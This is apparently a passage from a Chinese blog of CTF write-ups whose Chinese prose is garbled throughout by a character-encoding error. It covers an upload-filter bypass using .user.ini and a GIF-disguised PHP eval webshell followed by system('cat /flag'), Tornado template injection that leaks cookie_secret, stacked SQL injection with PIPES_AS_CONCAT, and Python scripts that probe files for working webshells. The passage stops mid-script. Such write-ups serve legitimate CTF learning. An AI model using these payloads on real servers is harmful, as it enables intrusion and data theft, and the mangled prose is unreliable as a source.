<p>ä»»æ„ä¸Šä¼ ä¸€å¼ å›¾åï¼Œå¾—åˆ°æ–‡ä»¶çš„è·¯å¾„<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g91xgu7vx2j30ws07amxj.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g91xgu7vx2j30ws07amxj.jpg" class="lazyload" title="test"></a></p>
<p>è¿™è¾¹è¿™å¼ æ˜¯è‡ªå·±ä¸€å¼€å§‹çš„æˆªå›¾ ä¸æ˜¯index.php æ–‡ä»¶çš„æ˜¾ç¤º<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g91xgujjcxj30v10710tc.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g91xgujjcxj30v10710tc.jpg" class="lazyload" title="test"></a></p>
<hr>
<p>å°è¯•åˆ©ç”¨ä¸Šä¼ .htaccessæ¥è§£æä¸Šä¼ çš„é©¬ã€‚<br>ç„¶è€Œè¿™é‡Œå°è¯•ä¸Šä¼ è¢«wafäº†<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g91xgu2v1pj309v05a748.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g91xgu2v1pj309v05a748.jpg" class="lazyload" title="test"></a></p>
<p>ç„¶åå°±å­¦åˆ°äº†æ–°çš„çŸ¥è¯†</p>
<h3 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h3><p>åŸç†å’Œ <code>.htaccess</code> ä¸€æ ·</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GIF89a  # ç»•è¿‡æ–‡ä»¶å¤´æ£€æµ‹</span><br><span class="line">auto_prepend_file &#x3D; aaaa.jpg</span><br></pre></td></tr></table></figure></div>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g91xgu9pwmj314f09swga.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g91xgu9pwmj314f09swga.jpg" class="lazyload" title="test"></a></p>
<p>aaaa.jpg ç»•è¿‡ <code>&lt;?</code> çš„è¿‡æ»¤</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#\x00\x00\x8a\x39\x8a\x39</span><br><span class="line">GIF89a</span><br><span class="line">&lt;script language&#x3D;&#39;php&#39;&gt;eval($_REQUEST[pass]);&lt;&#x2F;script&gt;</span><br><span class="line">#php5ç¯å¢ƒä¸‹å¯ç”¨</span><br></pre></td></tr></table></figure></div>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g91xgu9oryj315g0btn0e.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g91xgu9oryj315g0btn0e.jpg" class="lazyload" title="test"></a></p>
<p>ä¸Šä¼ åindex.phpä¼šé»˜è®¤åŒ…å«äº†ä¸€å¥è¯æœ¨é©¬ï¼Œå‘½ä»¤æ‰§è¡Œï¼Œå¾—åˆ°flag<br>payloadï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;uploads&#x2F;adeee0c170ad4ffb110df0cde294aecd&#x2F;index.php?pass&#x3D;system(&#39;cat &#x2F;flag&#39;);</span><br></pre></td></tr></table></figure></div>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g91xgu8ofwj30fr02f3yj.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g91xgu8ofwj30fr02f3yj.jpg" class="lazyload" title="test"></a></p>
<p>å½“ç„¶å› ä¸ºæœåŠ¡å™¨å¯¹æ–‡ä»¶å¤´æœ‰exif_typeçš„åˆ¤æ–­ï¼Œç›´æ¥é€šè¿‡xbmæ ¼å¼ç»•è¿‡ï¼Œä¼ .htaccesså’Œ.user.iniæ˜¯å¯ä»¥çš„</p>
<h3 id="æºç å¦‚ä¸‹"><a href="#æºç å¦‚ä¸‹" class="headerlink" title="æºç å¦‚ä¸‹"></a>æºç å¦‚ä¸‹</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// error_reporting(0);</span></span><br><span class="line">$userdir = <span class="string">"uploads/"</span> . md5($_SERVER[<span class="string">"REMOTE_ADDR"</span>]);</span><br><span class="line"><span class="keyword">if</span> (!file_exists($userdir))</span><br><span class="line">&#123;</span><br><span class="line">    mkdir($userdir, <span class="number">0777</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*è¿™é‡Œåˆ›å»ºçš„ç›®å½•æ˜¯777çš„æƒé™ï¼Œèµ›æ–‡èµ›æ–‡èµ›æ–‡ï¼ï¼ï¼*/</span></span><br><span class="line"></span><br><span class="line">file_put_contents($userdir . <span class="string">"/index.php"</span>, <span class="string">""</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"upload"</span>]))</span><br><span class="line"> &#123;</span><br><span class="line">    $tmp_name = $_FILES[<span class="string">"fileUpload"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">    $name = $_FILES[<span class="string">"fileUpload"</span>][<span class="string">"name"</span>];</span><br><span class="line">    <span class="keyword">if</span> (!$tmp_name)</span><br><span class="line">   &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"filesize too big!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!$name)</span><br><span class="line">   &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"filename cannot be empty!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    $extension = substr($name, strrpos($name, <span class="string">"."</span>) + <span class="number">1</span>);</span><br><span class="line">    <span class="comment">/*å¾—åˆ°åç¼€*/</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/ph|htacess/i"</span>, $extension))</span><br><span class="line">   &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"illegal suffix!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*æ­£åˆ™è¿‡æ»¤ .htacess ,å„ç§phpç±»å‹ï¼Œæœ‰äº†ä¸€ä¸ª i è¿å¤§å°å†™ç»•è¿‡éƒ½ä¸è¡Œ*/</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (mb_strpos(file_get_contents($tmp_name), <span class="string">"&lt;?"</span>) !== <span class="keyword">FALSE</span>)</span><br><span class="line">   &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"&lt;? in contents!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*è¿‡æ»¤äº† " &lt;? " ,è¿™ä¸ªåŠ ä¸Šä¸Šé¢ä¸€æ¡è¿‡æ»¤ï¼Œhtacessçš„å›¾ç‰‡é©¬å’Œä¸€å¥è¯åŸºæœ¬éƒ½æŒ‚äº†*/</span></span><br><span class="line">    </span><br><span class="line">    $image_type = exif_imagetype($tmp_name);</span><br><span class="line">    <span class="keyword">if</span> (!$image_type)</span><br><span class="line">  &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"exif_imagetype:not image!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*è¦ä¿®æ”¹ä¸€ä¸‹ â€œContent-Typeâ€çš„å€¼*/</span></span><br><span class="line">    </span><br><span class="line">    $upload_file_path = $userdir . <span class="string">"/"</span> . $name;</span><br><span class="line">    move_uploaded_file($tmp_name, $upload_file_path);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Your dir "</span> . $userdir. <span class="string">' &lt;br&gt;'</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Your files : &lt;br&gt;'</span>;</span><br><span class="line">    var_dump(scandir($userdir));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<hr>
<h3 id="ä¸€äº›çŸ¥è¯†ç‚¹"><a href="#ä¸€äº›çŸ¥è¯†ç‚¹" class="headerlink" title="ä¸€äº›çŸ¥è¯†ç‚¹"></a>ä¸€äº›çŸ¥è¯†ç‚¹</h3><p><strong>.user.ini</strong> ç±»ä¼¼<strong>.htaccess</strong>æ–‡ä»¶<br>å®ƒæ¯”<strong>.htaccess</strong>ç”¨çš„æ›´å¹¿ï¼Œä¸ç®¡æ˜¯ <code>nginx/apache/IIS</code>ï¼Œåªè¦æ˜¯ä»¥fastcgiè¿è¡Œçš„phpéƒ½å¯ä»¥ç”¨è¿™ä¸ªæ–¹æ³•<br><strong>.user.ini</strong>å®é™…ä¸Šå°±æ˜¯ä¸€ä¸ªå¯ä»¥ç”±ç”¨æˆ·<code>&quot;è‡ªå®šä¹‰&quot;</code>çš„php.iniã€€<br>ä¿®æ”¹äº†<strong>.user.ini</strong>åï¼Œä¸éœ€è¦é‡å¯æœåŠ¡å™¨ä¸­é—´ä»¶ï¼Œåªéœ€è¦ç­‰å¾… <code>user_ini.cache_ttl</code>æ‰€è®¾ç½®çš„æ—¶é—´ï¼ˆé»˜è®¤ä¸º300ç§’ï¼‰ï¼Œå³å¯è¢«é‡æ–°åŠ è½½ã€€</p>
]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTFDay2</title>
    <url>/yakko117/2019/11/10/BuuctfDay2/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="BUUCTF"><a href="#BUUCTF" class="headerlink" title="BUUCTF"></a>BUUCTF</h1><h2 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy_tornado"></a>easy_tornado</h2><p>ä¸»è¦è€ƒç‚¹æ˜¯ï¼š<strong>SSTiæ¨¡æ¿æ³¨å…¥</strong><br>ä¸€äº›å‚è€ƒæ–‡çŒ®å¦‚ä¸‹ï¼š<br><a href="https://www.freebuf.com/vuls/83999.html" target="_blank" rel="noopener">SSTIæ¨¡æ¿æ³¨å…¥æµ…è°ˆ</a><br><a href="http://ch.vksec.com/2017/06/tornado.html" target="_blank" rel="noopener">Tornadoæ¨¡æ¿æ³¨å…¥</a><br><a href="https://tornado.readthedocs.io/en/stable/" target="_blank" rel="noopener">å®˜æ–¹æ‰‹å†Œ</a><br><a href="https://www.cnblogs.com/cimuhuashuimu/p/11544455.html" target="_blank" rel="noopener">å¤§ä½¬çš„æ€è·¯</a></p>
<hr>
<p>æ‰“å¼€é¢˜ç›®<br><a href="https://wx3.sinaimg.cn/large/0077TIyQgy1g8nh0lfc57j307303ga9w.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://wx3.sinaimg.cn/large/0077TIyQgy1g8nh0lfc57j307303ga9w.jpg" class="lazyload" title="test"></a></p>
<p>ç‚¹å¼€æ¯ä¸ªé“¾æ¥çš„å†…å®¹å’ŒURLæ ¼å¼å¦‚ä¸‹</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;flag.txt</span><br><span class="line">flag in &#x2F;fllllllllllllag</span><br><span class="line"></span><br><span class="line">&#x2F;welcome.txt</span><br><span class="line">render</span><br><span class="line"></span><br><span class="line">&#x2F;hints.txt</span><br><span class="line">md5(cookie_secret+md5(filename))</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;file?filename&#x3D;&#x2F;hints.txt&amp;filehash&#x3D;8fd6c75084d062081fb182f4d18d938c</span><br></pre></td></tr></table></figure></div>

<p>ç°åœ¨<code>filename=/fllllllllllllag</code>ï¼Œåªéœ€è¦çŸ¥é“<code>cookie_secret</code>æ—¢èƒ½è®¿é—®<code>flag</code>ã€‚<br>æ ¹æ®æç¤ºflagæ‰€åœ¨æ–‡ä»¶å¤¹ï¼ŒåŠ ä¸Šè·¯å¾„å»è®¿é—®<br>å‘ç°æ— æ³•è®¿é—®ï¼Œè¢«è·³è½¬åˆ°ä¸€ä¸ªé”™è¯¯é¡µé¢<br>æ ¼å¼ä¸º <code>/error?msg=Error</code> å¼€å§‹åˆ¤æ–­æ˜¯ä¸ªæ¨¡æ¿æ³¨å…¥</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8nh0krwt0j30t105r0su.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8nh0krwt0j30t105r0su.jpg" class="lazyload" title="test"></a></p>
<hr>
<p>ç¿»äº†ä¸€ä¸‹<a href="https://tornado.readthedocs.io/en/latest/guide/templates.html" target="_blank" rel="noopener">æ‰‹å†Œ</a>å‘ç°ä¸€äº›å¯ä»¥è¾“å…¥çš„å‡½æ•°</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8nh0krojnj30vy0ictc9.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8nh0krojnj30vy0ictc9.jpg" class="lazyload" title="test"></a></p>
<p>æ‰¾åˆ°ä¸ª <code>datetime</code><br>åœ¨Tornadoçš„å‰ç«¯é¡µé¢æ¨¡æ¿ä¸­ï¼Œ<code>datetime</code>æ˜¯æŒ‡å‘<code>python</code>ä¸­<code>datetime</code>è¿™ä¸ªæ¨¡å—<br>å°è¯•æ³¨å…¥ï¼Œ å›æ˜¾å¦‚ä¸‹</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;error?msg&#x3D;&#123;&#123;datetime&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8nh0kob15j313405at98.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8nh0kob15j313405at98.jpg" class="lazyload" title="test"></a></p>
<hr>
<p>é€šè¿‡æŸ¥é˜…æ–‡æ¡£å‘ç°<code>cookie_secret</code>åœ¨<code>Application</code>å¯¹è±¡settingså±æ€§ä¸­ï¼Œè¿˜å‘ç°self.application.settings`æœ‰ä¸€ä¸ª<a href="https://tornado.readthedocs.io/en/latest/web.html#tornado.web.RequestHandler.settings" target="_blank" rel="noopener">åˆ«å</a></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">RequestHandler.settings</span><br><span class="line">An alias for self.application.settings.</span><br></pre></td></tr></table></figure></div>
<p><code>handler</code>æŒ‡å‘çš„å¤„ç†å½“å‰è¿™ä¸ªé¡µé¢çš„ <code>RequestHandler</code>å¯¹è±¡ï¼Œ<br><code>RequestHandler.settings</code> æŒ‡å‘ <code>self.application.settings</code>ï¼Œ<br>å› æ­¤ <code>handler.settings</code> æŒ‡å‘ <code>RequestHandler.application.settings</code>ã€‚</p>
<p>æ„é€ payloadè·å– <code>cookie_secret</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;error?msg&#x3D;&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<p><a href="https://wx2.sinaimg.cn/large/0077TIyQgy1g8nh0kod92j31az04wjs0.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://wx2.sinaimg.cn/large/0077TIyQgy1g8nh0kod92j31az04wjs0.jpg" class="lazyload" title="test"></a></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;cookie_secret&#39;: &#39;4099719d-a30b-4e20-a2b1-2186e5d29ee4&#39;</span><br></pre></td></tr></table></figure></div>

<p>è®¡ç®—filehashå€¼(ç”¨py2.xç‰ˆæœ¬)</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(s)</span>:</span></span><br><span class="line"> md5 = hashlib.md5() </span><br><span class="line"> md5.update(s) </span><br><span class="line"> <span class="keyword">return</span> md5.hexdigest()</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">filehash</span><span class="params">()</span>:</span></span><br><span class="line"> filename = <span class="string">'/fllllllllllllag'</span></span><br><span class="line"> cookie_secret = <span class="string">'4099719d-a30b-4e20-a2b1-2186e5d29ee4'</span></span><br><span class="line"> print(md5(cookie_secret+md5(filename)))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"> filehash()</span><br></pre></td></tr></table></figure></div>

<p>å¾—åˆ°filehashå¦‚ä¸‹</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a84914638153ac0968136ee5d5f19152</span><br><span class="line"></span><br><span class="line">æäº¤payloadå¦‚ä¸‹ï¼š</span><br><span class="line">file?filename&#x3D;&#x2F;fllllllllllllag&amp;filehash&#x3D;a84914638153ac0968136ee5d5f19152</span><br><span class="line"></span><br><span class="line">å¾—åˆ°flag</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p>å‚è€ƒæ–‡çŒ®<br><a href="https://www.cnblogs.com/fireporsche/p/8618691.html" target="_blank" rel="noopener">MySQLçš„sql_modeè§£æä¸è®¾ç½®</a></p>
<p>è¿›å…¥é¡µé¢åï¼Œæç¤ºè¦æ±‚è¾“å…¥æ­£ç¡®çš„Flagå³å¯è·å¾—flagï¼Œå­˜åœ¨å †å æ³¨å…¥å¦‚ä¸‹ï¼Œä½†æ˜¯è¿‡æ»¤äº†flagã€‚</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8nh0kom5xj30hy046aa1.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8nh0kom5xj30hy046aa1.jpg" class="lazyload" title="test"></a></p>
<p>è¿›è¡Œå †å æŸ¥è¯¢ï¼Œ<code>1; show tables #</code>ï¼Œå›æ˜¾å¦‚ä¸‹</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8nh0ksjt6j30ii04574d.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8nh0ksjt6j30ii04574d.jpg" class="lazyload" title="test"></a></p>
<p>æ ¹æ®å›æ˜¾çŒœæµ‹æŸ¥è¯¢è¯­å¥ä¸ºï¼š<code>.. POST[&#39;query&#39;]||flag ...</code></p>
<h3 id="éé¢„æœŸè§£"><a href="#éé¢„æœŸè§£" class="headerlink" title="éé¢„æœŸè§£"></a>éé¢„æœŸè§£</h3><p>æ„é€ payloadï¼š<code>*,1</code>ï¼Œè¿™æ ·æ‹¼æ¥åå¾—åˆ°ï¼š<code>select *,1||flag from Flag</code> ï¼Œå³å¯ä»¥æŸ¥å‡ºå½“å‰è¡¨ä¸­å…¨éƒ¨å†…å®¹ã€‚</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8nh0ksuuuj30lp041glr.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8nh0ksuuuj30lp041glr.jpg" class="lazyload" title="test"></a></p>
<h3 id="é¢„æœŸè§£æ³•"><a href="#é¢„æœŸè§£æ³•" class="headerlink" title="é¢„æœŸè§£æ³•"></a>é¢„æœŸè§£æ³•</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PIPES_AS_CONCATï¼š</span><br><span class="line">å°†&quot;||&quot;è§†ä¸ºå­—ç¬¦ä¸²çš„è¿æ¥æ“ä½œç¬¦è€Œéæˆ–è¿ç®—ç¬¦</span><br></pre></td></tr></table></figure></div>

<p>æ‰€ä»¥payloadä¸ºï¼š<code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code><br>è¿™æ ·è¾“å‡ºçš„flagä¼šä¸1è¿›è¡Œæ‹¼æ¥ï¼Œå¾—åˆ°ï¼š</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g8o133rj6ij30p303z0sz.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g8o133rj6ij30p303z0sz.jpg" class="lazyload" title="test"></a></p>
<hr>
<h2 id="å¼ºç½‘æ¯-2019-é«˜æ˜çš„é»‘å®¢"><a href="#å¼ºç½‘æ¯-2019-é«˜æ˜çš„é»‘å®¢" class="headerlink" title="[å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢"></a>[å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢</h2><p>æ‰“å¼€é¢˜ç›®ï¼Œè¯´æ–‡ä»¶æºç æ³„éœ²</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g8o133vcqrj30yn05cq3o.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g8o133vcqrj30yn05cq3o.jpg" class="lazyload" title="test"></a></p>
<p>ä¸‹è½½<code>www.tar.gz</code>ï¼Œ æŸ¥çœ‹å‘ç°å…¨æ˜¯äº›æ··æ·†çš„ä¹±ç ï¼Œä½†è¿˜æ˜¯å¯ä»¥çœ‹å‡ºè§„å¾‹<br>å¯ä»¥é€šè¿‡GETï¼ŒPOSTï¼Œexecï¼Œevalï¼Œassertä¼ å‚å›æ˜¾</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g8o1340o6gj30kk0fn0w3.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g8o1340o6gj30kk0fn0w3.jpg" class="lazyload" title="test"></a></p>
<p>ç»“åˆwpçš„è„šæœ¬æ‰¹é‡æ‰«æä¸€ä¸‹æ–‡ä»¶é‡Œçš„<code>$_GET</code>å’Œ<code>$_POST</code>ï¼Œç„¶åç»Ÿä¸€èµ‹å€¼echo â€œgot itâ€ï¼Œå¦‚æœå›æ˜¾ç»“æœä¸­åŒ…å«got itï¼Œé‚£ä¹ˆè¯æ˜è¯¥æ–‡ä»¶ä¸ºå¯ç”¨shell</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">// å¤§ä½¬çš„è¿™ä¸ªæˆ‘æ²¡è·‘å‡ºæ¥</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"></span><br><span class="line">path = <span class="string">"D:/phpStudy/PHPTutorial/WWW/src/"</span></span><br><span class="line">files = os.listdir(path)</span><br><span class="line">url = <span class="string">"http://localhost/src/"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">extract</span><span class="params">(f)</span>:</span></span><br><span class="line">    gets = []</span><br><span class="line">    <span class="keyword">with</span> open(path+f, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        lines = f.readlines()</span><br><span class="line">        lines = [i.strip() <span class="keyword">for</span> i <span class="keyword">in</span> lines]</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">            <span class="keyword">if</span> line.find(<span class="string">"$_GET['"</span>) &gt; <span class="number">0</span>:</span><br><span class="line">                start_pos = line.find(<span class="string">"$_GET['"</span>) + len(<span class="string">"$_GET['"</span>)</span><br><span class="line">                end_pos = line.find(<span class="string">"'"</span>, start_pos)</span><br><span class="line">                gets.append(line[start_pos:end_pos])</span><br><span class="line">    <span class="keyword">return</span> gets</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(start, end)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(start, end):</span><br><span class="line">        filename = files[i]</span><br><span class="line">        gets = extract(filename)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"try: %s"</span> % filename</span><br><span class="line">        <span class="keyword">for</span> get <span class="keyword">in</span> gets:</span><br><span class="line">            new_url = <span class="string">"%s%s?%s=%s"</span> % (url, filename, get, <span class="string">'echo "got it"'</span>)</span><br><span class="line">            r = requests.get(new_url)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'got it'</span> <span class="keyword">in</span> r.content:</span><br><span class="line">                <span class="keyword">print</span> new_url</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    pool = Pool(processes=<span class="number">15</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(files), len(files)/<span class="number">15</span>):</span><br><span class="line">        pool.apply_async(exp, (i, +len(files)/<span class="number">15</span>,))</span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div>

<hr>
<p>åæ¥æ‰¾äº†ä¸ªå…¶ä»–çš„ï¼Œå°±æ˜¯è·‘çš„æ…¢äº†ç‚¹</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os,re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">filenames = os.listdir(<span class="string">'D:\phpstudy\PHPTutorial\WWW\src/'</span>)</span><br><span class="line">pattern = re.compile(<span class="string">r"\$_[GEPOST]&#123;3,4&#125;\[.*\]"</span>)</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> filenames:</span><br><span class="line">    print(name)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'D:\phpstudy\PHPTutorial\WWW\src/'</span>+name,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    result = list(set(pattern.findall(data)))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ret <span class="keyword">in</span> result:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            command = <span class="string">'echo "got it"'</span></span><br><span class="line">            flag = <span class="string">'got it'</span></span><br><span class="line">            <span class="comment"># command = 'phpinfo();'</span></span><br><span class="line">            <span class="comment"># flag = 